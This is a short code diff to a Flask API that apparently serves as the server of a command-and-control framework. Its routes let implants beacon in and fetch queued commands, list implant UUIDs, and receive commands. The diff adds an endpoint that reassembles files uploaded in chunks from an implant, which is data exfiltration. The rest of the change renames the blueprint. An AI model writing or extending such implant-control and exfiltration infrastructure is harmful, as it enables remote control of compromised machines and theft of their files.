@@ -5,10 +5,10 @@ import logging
 
 logging.basicConfig(level=logging.DEBUG)
 
-bp = Blueprint("api", __name__, url_prefix="/api/v1")
+BP = Blueprint("api", __name__, url_prefix="/api/v1")
 
 
-@bp.route("/beacon", methods=["POST"])
+@BP.route("/beacon", methods=["POST"])
 def beacon():
     data = request.get_json()
     timestamp = data.get("timestamp")
@@ -23,7 +23,7 @@ def beacon():
     return jsonify(command_response)
 
 
-@bp.route("/command", methods=["POST"])
+@BP.route("/command", methods=["POST"])
 def command():
     data = request.get_json()
     command_text = data.get("command")
@@ -39,15 +39,30 @@ def command():
         return jsonify({"message": "Given UUID is not in use."}), 404
 
 
-@bp.route("/uuids", methods=["GET"])
+@BP.route("/uuids", methods=["GET"])
 def list_uuids():
     uuids = services.list_all_uuids()
     return jsonify(uuids)
 
 
-@bp.route("/commands/<uuid>", methods=["GET"])
+@BP.route("/commands/<uuid>", methods=["GET"])
 def get_commands(uuid):
     commands = services.get_commands_for_uuid(uuid)
     if commands is None:
         return jsonify({"message": "No commands found"}), 404
     return jsonify(commands)
+
+
+@BP.route("/file", methods=["POST"])
+def file_chunk():
+    data = request.get_json()
+    implant_uuid = data.get("uuid")
+    file_id = data.get("file_id")
+    chunk_index = data.get("chunk_index")
+    chunk_data = data.get("chunk_data")
+
+    if not (implant_uuid and file_id and chunk_index is not None and chunk_data):
+        return jsonify({"status": "Invalid data"}), 400
+
+    services.save_file_chunk(implant_uuid, file_id, chunk_index, chunk_data)
+    return jsonify({"status": "Chunk received"}), 200
